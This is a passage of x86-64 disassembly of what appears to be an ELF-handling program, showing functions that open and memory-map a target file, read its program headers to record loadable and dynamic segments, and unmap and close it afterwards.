  400fd8:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400fdc:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400fe0:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400fe4:	48 8b 4d f0          	mov    rcx,QWORD PTR [rbp-0x10]
  400fe8:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400fec:	48 29 c1             	sub    rcx,rax
  400fef:	48 89 c8             	mov    rax,rcx
  400ff2:	48 98                	cdqe   
  400ff4:	48 01 c2             	add    rdx,rax
  400ff7:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400ffb:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400fff:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  401003:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  401007:	48 8d 90 68 42 00 00 	lea    rdx,[rax+0x4268]
  40100e:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  401012:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  401016:	b8 00 00 00 00       	mov    eax,0x0
  40101b:	c9                   	leave  
  40101c:	c3                   	ret    

000000000040101d <unload_target>:
  40101d:	55                   	push   rbp
  40101e:	48 89 e5             	mov    rbp,rsp
  401021:	48 83 ec 10          	sub    rsp,0x10
  401025:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  401029:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40102d:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  401031:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  401035:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  401039:	48 89 d6             	mov    rsi,rdx
  40103c:	48 89 c7             	mov    rdi,rax
  40103f:	e8 05 13 00 00       	call   402349 <_munmap>
  401044:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  401048:	8b 80 f8 00 00 00    	mov    eax,DWORD PTR [rax+0xf8]
  40104e:	89 c7                	mov    edi,eax
  401050:	e8 4c 11 00 00       	call   4021a1 <_close>
  401055:	90                   	nop
  401056:	c9                   	leave  
  401057:	c3                   	ret    

0000000000401058 <load_target>:
  401058:	55                   	push   rbp
  401059:	48 89 e5             	mov    rbp,rsp
  40105c:	48 81 ec b0 00 00 00 	sub    rsp,0xb0
  401063:	48 89 bd 58 ff ff ff 	mov    QWORD PTR [rbp-0xa8],rdi
  40106a:	48 89 b5 50 ff ff ff 	mov    QWORD PTR [rbp-0xb0],rsi
  401071:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401078:	48 8b 95 58 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xa8]
  40107f:	48 89 50 60          	mov    QWORD PTR [rax+0x60],rdx
  401083:	48 8b 85 58 ff ff ff 	mov    rax,QWORD PTR [rbp-0xa8]
  40108a:	ba 00 00 00 00       	mov    edx,0x0
  40108f:	be 00 00 00 00       	mov    esi,0x0
  401094:	48 89 c7             	mov    rdi,rax
  401097:	e8 d3 10 00 00       	call   40216f <_open>
  40109c:	89 45 f8             	mov    DWORD PTR [rbp-0x8],eax
  40109f:	83 7d f8 00          	cmp    DWORD PTR [rbp-0x8],0x0
  4010a3:	79 0a                	jns    4010af <load_target+0x57>
  4010a5:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4010aa:	e9 ad 03 00 00       	jmp    40145c <load_target+0x404>
  4010af:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4010b6:	8b 55 f8             	mov    edx,DWORD PTR [rbp-0x8]
  4010b9:	89 90 f8 00 00 00    	mov    DWORD PTR [rax+0xf8],edx
  4010bf:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4010c2:	48 98                	cdqe   
  4010c4:	48 8d 95 60 ff ff ff 	lea    rdx,[rbp-0xa0]
  4010cb:	48 89 d6             	mov    rsi,rdx
  4010ce:	48 89 c7             	mov    rdi,rax
  4010d1:	e8 49 11 00 00       	call   40221f <_fstat>
  4010d6:	85 c0                	test   eax,eax
  4010d8:	79 0a                	jns    4010e4 <load_target+0x8c>
  4010da:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4010df:	e9 78 03 00 00       	jmp    40145c <load_target+0x404>
  4010e4:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4010e7:	48 98                	cdqe   
  4010e9:	48 8b 55 90          	mov    rdx,QWORD PTR [rbp-0x70]
  4010ed:	48 89 d6             	mov    rsi,rdx
  4010f0:	41 b9 00 00 00 00    	mov    r9d,0x0
  4010f6:	49 89 c0             	mov    r8,rax
  4010f9:	b9 02 00 00 00       	mov    ecx,0x2
  4010fe:	ba 03 00 00 00       	mov    edx,0x3
  401103:	bf 00 00 00 00       	mov    edi,0x0
  401108:	e8 da 11 00 00       	call   4022e7 <_mmap>
  40110d:	48 89 c2             	mov    rdx,rax
  401110:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401117:	48 89 50 50          	mov    QWORD PTR [rax+0x50],rdx
  40111b:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401122:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  401126:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  40112a:	75 0a                	jne    401136 <load_target+0xde>
  40112c:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401131:	e9 26 03 00 00       	jmp    40145c <load_target+0x404>
  401136:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40113d:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401141:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401148:	48 89 10             	mov    QWORD PTR [rax],rdx
  40114b:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401152:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401156:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40115d:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401160:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401164:	48 01 c2             	add    rdx,rax
  401167:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40116e:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  401172:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401179:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40117d:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401184:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401187:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  40118b:	48 01 c2             	add    rdx,rax
  40118e:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401195:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  401199:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4011a0:	e9 b6 01 00 00       	jmp    40135b <load_target+0x303>
  4011a5:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4011ac:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4011b0:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4011b3:	48 63 d0             	movsxd rdx,eax
  4011b6:	48 89 d0             	mov    rax,rdx
  4011b9:	48 c1 e0 03          	shl    rax,0x3
  4011bd:	48 29 d0             	sub    rax,rdx
  4011c0:	48 c1 e0 03          	shl    rax,0x3
  4011c4:	48 01 c8             	add    rax,rcx
  4011c7:	8b 00                	mov    eax,DWORD PTR [rax]
  4011c9:	83 f8 01             	cmp    eax,0x1
  4011cc:	74 0e                	je     4011dc <load_target+0x184>
  4011ce:	83 f8 02             	cmp    eax,0x2
  4011d1:	0f 84 3f 01 00 00    	je     401316 <load_target+0x2be>
  4011d7:	e9 7b 01 00 00       	jmp    401357 <load_target+0x2ff>
  4011dc:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4011e3:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4011e7:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4011ea:	48 63 d0             	movsxd rdx,eax
  4011ed:	48 89 d0             	mov    rax,rdx
  4011f0:	48 c1 e0 03          	shl    rax,0x3
  4011f4:	48 29 d0             	sub    rax,rdx
  4011f7:	48 c1 e0 03          	shl    rax,0x3
  4011fb:	48 01 c8             	add    rax,rcx
  4011fe:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401202:	48 85 c0             	test   rax,rax
  401205:	0f 95 c0             	setne  al
  401208:	0f b6 c0             	movzx  eax,al
  40120b:	85 c0                	test   eax,eax
  40120d:	74 0a                	je     401219 <load_target+0x1c1>
  40120f:	83 f8 01             	cmp    eax,0x1
  401212:	74 6c                	je     401280 <load_target+0x228>
  401214:	e9 3e 01 00 00       	jmp    401357 <load_target+0x2ff>
  401219:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401220:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401224:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401227:	48 63 d0             	movsxd rdx,eax
  40122a:	48 89 d0             	mov    rax,rdx
  40122d:	48 c1 e0 03          	shl    rax,0x3
  401231:	48 29 d0             	sub    rax,rdx
  401234:	48 c1 e0 03          	shl    rax,0x3
  401238:	48 01 c8             	add    rax,rcx
  40123b:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  40123f:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401246:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  40124a:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401251:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401255:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401258:	48 63 d0             	movsxd rdx,eax
  40125b:	48 89 d0             	mov    rax,rdx
  40125e:	48 c1 e0 03          	shl    rax,0x3
  401262:	48 29 d0             	sub    rax,rdx
  401265:	48 c1 e0 03          	shl    rax,0x3
  401269:	48 01 c8             	add    rax,rcx
  40126c:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  401270:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401277:	48 89 50 30          	mov    QWORD PTR [rax+0x30],rdx
  40127b:	e9 94 00 00 00       	jmp    401314 <load_target+0x2bc>
  401280:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401287:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40128b:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40128e:	48 63 d0             	movsxd rdx,eax
  401291:	48 89 d0             	mov    rax,rdx
  401294:	48 c1 e0 03          	shl    rax,0x3
  401298:	48 29 d0             	sub    rax,rdx
  40129b:	48 c1 e0 03          	shl    rax,0x3
  40129f:	48 01 c8             	add    rax,rcx
  4012a2:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  4012a6:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4012ad:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  4012b1:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4012b8:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4012bc:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4012bf:	48 63 d0             	movsxd rdx,eax
  4012c2:	48 89 d0             	mov    rax,rdx
  4012c5:	48 c1 e0 03          	shl    rax,0x3
  4012c9:	48 29 d0             	sub    rax,rdx
  4012cc:	48 c1 e0 03          	shl    rax,0x3
  4012d0:	48 01 c8             	add    rax,rcx
  4012d3:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  4012d7:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4012de:	48 89 50 38          	mov    QWORD PTR [rax+0x38],rdx
  4012e2:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4012e9:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4012ed:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4012f0:	48 63 d0             	movsxd rdx,eax
  4012f3:	48 89 d0             	mov    rax,rdx
  4012f6:	48 c1 e0 03          	shl    rax,0x3
  4012fa:	48 29 d0             	sub    rax,rdx
  4012fd:	48 c1 e0 03          	shl    rax,0x3
  401301:	48 01 c8             	add    rax,rcx
  401304:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  401308:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40130f:	48 89 50 40          	mov    QWORD PTR [rax+0x40],rdx
  401313:	90                   	nop
  401314:	eb 41                	jmp    401357 <load_target+0x2ff>
  401316:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40131d:	48 8b 48 50          	mov    rcx,QWORD PTR [rax+0x50]
  401321:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401328:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  40132c:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40132f:	48 63 d0             	movsxd rdx,eax
  401332:	48 89 d0             	mov    rax,rdx
  401335:	48 c1 e0 03          	shl    rax,0x3
  401339:	48 29 d0             	sub    rax,rdx
  40133c:	48 c1 e0 03          	shl    rax,0x3
  401340:	48 01 f0             	add    rax,rsi
  401343:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401347:	48 8d 14 01          	lea    rdx,[rcx+rax*1]
  40134b:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401352:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  401356:	90                   	nop
  401357:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  40135b:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401362:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401365:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  401369:	0f b7 c0             	movzx  eax,ax
  40136c:	39 45 fc             	cmp    DWORD PTR [rbp-0x4],eax
  40136f:	0f 8c 30 fe ff ff    	jl     4011a5 <load_target+0x14d>
  401375:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40137c:	48 8b 95 60 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xa0]
  401383:	48 8b 8d 68 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x98]
  40138a:	48 89 50 68          	mov    QWORD PTR [rax+0x68],rdx
  40138e:	48 89 48 70          	mov    QWORD PTR [rax+0x70],rcx
  401392:	48 8b 95 70 ff ff ff 	mov    rdx,QWORD PTR [rbp-0x90]
  401399:	48 8b 8d 78 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x88]
  4013a0:	48 89 50 78          	mov    QWORD PTR [rax+0x78],rdx
  4013a4:	48 89 88 80 00 00 00 	mov    QWORD PTR [rax+0x80],rcx
  4013ab:	48 8b 55 80          	mov    rdx,QWORD PTR [rbp-0x80]
  4013af:	48 8b 4d 88          	mov    rcx,QWORD PTR [rbp-0x78]
  4013b3:	48 89 90 88 00 00 00 	mov    QWORD PTR [rax+0x88],rdx
  4013ba:	48 89 88 90 00 00 00 	mov    QWORD PTR [rax+0x90],rcx
  4013c1:	48 8b 55 90          	mov    rdx,QWORD PTR [rbp-0x70]
  4013c5:	48 8b 4d 98          	mov    rcx,QWORD PTR [rbp-0x68]
  4013c9:	48 89 90 98 00 00 00 	mov    QWORD PTR [rax+0x98],rdx
  4013d0:	48 89 88 a0 00 00 00 	mov    QWORD PTR [rax+0xa0],rcx
  4013d7:	48 8b 55 a0          	mov    rdx,QWORD PTR [rbp-0x60]
  4013db:	48 8b 4d a8          	mov    rcx,QWORD PTR [rbp-0x58]
  4013df:	48 89 90 a8 00 00 00 	mov    QWORD PTR [rax+0xa8],rdx
  4013e6:	48 89 88 b0 00 00 00 	mov    QWORD PTR [rax+0xb0],rcx
  4013ed:	48 8b 55 b0          	mov    rdx,QWORD PTR [rbp-0x50]
  4013f1:	48 8b 4d b8          	mov    rcx,QWORD PTR [rbp-0x48]
  4013f5:	48 89 90 b8 00 00 00 	mov    QWORD PTR [rax+0xb8],rdx
  4013fc:	48 89 88 c0 00 00 00 	mov    QWORD PTR [rax+0xc0],rcx
  401403:	48 8b 55 c0          	mov    rdx,QWORD PTR [rbp-0x40]
  401407:	48 8b 4d c8          	mov    rcx,QWORD PTR [rbp-0x38]
  40140b:	48 89 90 c8 00 00 00 	mov    QWORD PTR [rax+0xc8],rdx
  401412:	48 89 88 d0 00 00 00 	mov    QWORD PTR [rax+0xd0],rcx
  401419:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  40141d:	48 8b 4d d8          	mov    rcx,QWORD PTR [rbp-0x28]
  401421:	48 89 90 d8 00 00 00 	mov    QWORD PTR [rax+0xd8],rdx
  401428:	48 89 88 e0 00 00 00 	mov    QWORD PTR [rax+0xe0],rcx
  40142f:	48 8b 55 e0          	mov    rdx,QWORD PTR [rbp-0x20]
  401433:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  401437:	48 89 90 e8 00 00 00 	mov    QWORD PTR [rax+0xe8],rdx
  40143e:	48 89 88 f0 00 00 00 	mov    QWORD PTR [rax+0xf0],rcx
  401445:	48 8b 45 90          	mov    rax,QWORD PTR [rbp-0x70]
  401449:	48 89 c2             	mov    rdx,rax
  40144c:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401453:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  401457:	b8 00 00 00 00       	mov    eax,0x0
  40145c:	c9                   	leave  
  40145d:	c3                   	ret    

000000000040145e <load_target_writeable>:
  40145e:	55                   	push   rbp
  40145f:	48 89 e5             	mov    rbp,rsp
  401462:	48 81 ec b0 00 00 00 	sub    rsp,0xb0
  401469:	48 89 bd 58 ff ff ff 	mov    QWORD PTR [rbp-0xa8],rdi
  401470:	48 89 b5 50 ff ff ff 	mov    QWORD PTR [rbp-0xb0],rsi
  401477:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40147e:	48 8b 95 58 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xa8]
  401485:	48 89 50 60          	mov    QWORD PTR [rax+0x60],rdx
  401489:	48 8b 85 58 ff ff ff 	mov    rax,QWORD PTR [rbp-0xa8]
  401490:	ba 00 00 00 00       	mov    edx,0x0
  401495:	be 02 00 00 00       	mov    esi,0x2
  40149a:	48 89 c7             	mov    rdi,rax
  40149d:	e8 cd 0c 00 00       	call   40216f <_open>
  4014a2:	89 45 f8             	mov    DWORD PTR [rbp-0x8],eax
  4014a5:	83 7d f8 00          	cmp    DWORD PTR [rbp-0x8],0x0
  4014a9:	79 0a                	jns    4014b5 <load_target_writeable+0x57>
  4014ab:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4014b0:	e9 ad 03 00 00       	jmp    401862 <load_target_writeable+0x404>
  4014b5:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4014bc:	8b 55 f8             	mov    edx,DWORD PTR [rbp-0x8]
  4014bf:	89 90 f8 00 00 00    	mov    DWORD PTR [rax+0xf8],edx
  4014c5:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4014c8:	48 98                	cdqe   
  4014ca:	48 8d 95 60 ff ff ff 	lea    rdx,[rbp-0xa0]
  4014d1:	48 89 d6             	mov    rsi,rdx
  4014d4:	48 89 c7             	mov    rdi,rax
  4014d7:	e8 43 0d 00 00       	call   40221f <_fstat>
  4014dc:	85 c0                	test   eax,eax
  4014de:	79 0a                	jns    4014ea <load_target_writeable+0x8c>
  4014e0:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4014e5:	e9 78 03 00 00       	jmp    401862 <load_target_writeable+0x404>
  4014ea:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4014ed:	48 98                	cdqe   
  4014ef:	48 8b 55 90          	mov    rdx,QWORD PTR [rbp-0x70]
  4014f3:	48 89 d6             	mov    rsi,rdx
  4014f6:	41 b9 00 00 00 00    	mov    r9d,0x0
  4014fc:	49 89 c0             	mov    r8,rax
  4014ff:	b9 01 00 00 00       	mov    ecx,0x1
  401504:	ba 03 00 00 00       	mov    edx,0x3
  401509:	bf 00 00 00 00       	mov    edi,0x0
  40150e:	e8 d4 0d 00 00       	call   4022e7 <_mmap>
  401513:	48 89 c2             	mov    rdx,rax
  401516:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40151d:	48 89 50 50          	mov    QWORD PTR [rax+0x50],rdx
  401521:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401528:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40152c:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  401530:	75 0a                	jne    40153c <load_target_writeable+0xde>
  401532:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401537:	e9 26 03 00 00       	jmp    401862 <load_target_writeable+0x404>
  40153c:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401543:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401547:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40154e:	48 89 10             	mov    QWORD PTR [rax],rdx
  401551:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401558:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40155c:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401563:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401566:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  40156a:	48 01 c2             	add    rdx,rax
  40156d:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401574:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  401578:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40157f:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401583:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40158a:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40158d:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401591:	48 01 c2             	add    rdx,rax
  401594:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40159b:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  40159f:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4015a6:	e9 b6 01 00 00       	jmp    401761 <load_target_writeable+0x303>
  4015ab:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4015b2:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4015b6:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4015b9:	48 63 d0             	movsxd rdx,eax
  4015bc:	48 89 d0             	mov    rax,rdx
  4015bf:	48 c1 e0 03          	shl    rax,0x3
  4015c3:	48 29 d0             	sub    rax,rdx
  4015c6:	48 c1 e0 03          	shl    rax,0x3
  4015ca:	48 01 c8             	add    rax,rcx
  4015cd:	8b 00                	mov    eax,DWORD PTR [rax]
  4015cf:	83 f8 01             	cmp    eax,0x1
  4015d2:	74 0e                	je     4015e2 <load_target_writeable+0x184>
  4015d4:	83 f8 02             	cmp    eax,0x2
  4015d7:	0f 84 3f 01 00 00    	je     40171c <load_target_writeable+0x2be>
  4015dd:	e9 7b 01 00 00       	jmp    40175d <load_target_writeable+0x2ff>
  4015e2:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4015e9:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4015ed:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4015f0:	48 63 d0             	movsxd rdx,eax
  4015f3:	48 89 d0             	mov    rax,rdx
  4015f6:	48 c1 e0 03          	shl    rax,0x3
  4015fa:	48 29 d0             	sub    rax,rdx
  4015fd:	48 c1 e0 03          	shl    rax,0x3
  401601:	48 01 c8             	add    rax,rcx
  401604:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401608:	48 85 c0             	test   rax,rax
  40160b:	0f 95 c0             	setne  al
  40160e:	0f b6 c0             	movzx  eax,al
  401611:	85 c0                	test   eax,eax
  401613:	74 0a                	je     40161f <load_target_writeable+0x1c1>
  401615:	83 f8 01             	cmp    eax,0x1
  401618:	74 6c                	je     401686 <load_target_writeable+0x228>
  40161a:	e9 3e 01 00 00       	jmp    40175d <load_target_writeable+0x2ff>
  40161f:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401626:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40162a:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40162d:	48 63 d0             	movsxd rdx,eax
  401630:	48 89 d0             	mov    rax,rdx
  401633:	48 c1 e0 03          	shl    rax,0x3
  401637:	48 29 d0             	sub    rax,rdx
  40163a:	48 c1 e0 03          	shl    rax,0x3
  40163e:	48 01 c8             	add    rax,rcx
  401641:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  401645:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40164c:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  401650:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401657:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40165b:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40165e:	48 63 d0             	movsxd rdx,eax
  401661:	48 89 d0             	mov    rax,rdx
  401664:	48 c1 e0 03          	shl    rax,0x3
  401668:	48 29 d0             	sub    rax,rdx
  40166b:	48 c1 e0 03          	shl    rax,0x3
  40166f:	48 01 c8             	add    rax,rcx
  401672:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  401676:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40167d:	48 89 50 30          	mov    QWORD PTR [rax+0x30],rdx
  401681:	e9 94 00 00 00       	jmp    40171a <load_target_writeable+0x2bc>
  401686:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  40168d:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401691:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401694:	48 63 d0             	movsxd rdx,eax
  401697:	48 89 d0             	mov    rax,rdx
  40169a:	48 c1 e0 03          	shl    rax,0x3
  40169e:	48 29 d0             	sub    rax,rdx
  4016a1:	48 c1 e0 03          	shl    rax,0x3
  4016a5:	48 01 c8             	add    rax,rcx
  4016a8:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  4016ac:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4016b3:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  4016b7:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4016be:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4016c2:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4016c5:	48 63 d0             	movsxd rdx,eax
  4016c8:	48 89 d0             	mov    rax,rdx
  4016cb:	48 c1 e0 03          	shl    rax,0x3
  4016cf:	48 29 d0             	sub    rax,rdx
  4016d2:	48 c1 e0 03          	shl    rax,0x3
  4016d6:	48 01 c8             	add    rax,rcx
  4016d9:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  4016dd:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4016e4:	48 89 50 38          	mov    QWORD PTR [rax+0x38],rdx
  4016e8:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  4016ef:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4016f3:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4016f6:	48 63 d0             	movsxd rdx,eax
  4016f9:	48 89 d0             	mov    rax,rdx
  4016fc:	48 c1 e0 03          	shl    rax,0x3
  401700:	48 29 d0             	sub    rax,rdx
  401703:	48 c1 e0 03          	shl    rax,0x3
  401707:	48 01 c8             	add    rax,rcx
  40170a:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  40170e:	48 8b 85 50 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb0]
  401715:	48 89 50 40          	mov    QWORD PTR [rax+0x40],rdx
  401719:	90                   	nop
  40171a:	eb 41                	jmp    40175d <load_target_writeable+0x2ff>
